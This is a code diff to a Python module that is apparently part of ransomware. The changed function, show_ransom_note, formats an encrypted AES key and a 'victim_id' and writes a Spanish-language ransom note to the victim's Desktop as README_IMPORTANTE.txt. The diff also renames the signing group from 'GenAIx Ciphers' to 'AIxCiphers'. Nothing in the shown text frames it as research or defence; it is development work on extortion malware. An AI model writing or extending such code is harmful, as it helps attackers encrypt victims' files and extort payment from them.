@@ -4,13 +4,13 @@ from decrypt import load_aes_key_encrypted
 import base64
 import agent 
 
-desktop = os.path.join(os.path.expanduser("~"), "Desktop")
-aes_key_encrypted = load_aes_key_encrypted()
-aes_key_encrypted_b64 = base64.b64encode(aes_key_encrypted).decode()
-aes_key_formatted = "\n".join([aes_key_encrypted_b64[i:i+64] for i in range(0, len(aes_key_encrypted_b64), 64)])
-victim_id = agent.get_agent_id()
-
 def show_ransom_note():
+
+    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
+    aes_key_encrypted = load_aes_key_encrypted()
+    aes_key_encrypted_b64 = base64.b64encode(aes_key_encrypted).decode()
+    aes_key_formatted = "\n".join([aes_key_encrypted_b64[i:i+64] for i in range(0, len(aes_key_encrypted_b64), 64)])
+    victim_id = agent.get_agent_id()
     
     # Contenido de la nota de rescate
     note = f"""
@@ -50,7 +50,7 @@ No puedes acceder a ellos ni recuperarlos sin nuestra ayuda.
 {aes_key_formatted}
 
 Atentamente, 
-GenAIx Ciphers
+AIxCiphers
 """
     # Ruta donde se guardará la nota de rescate
     note_path = os.path.join(desktop, "README_IMPORTANTE.txt")
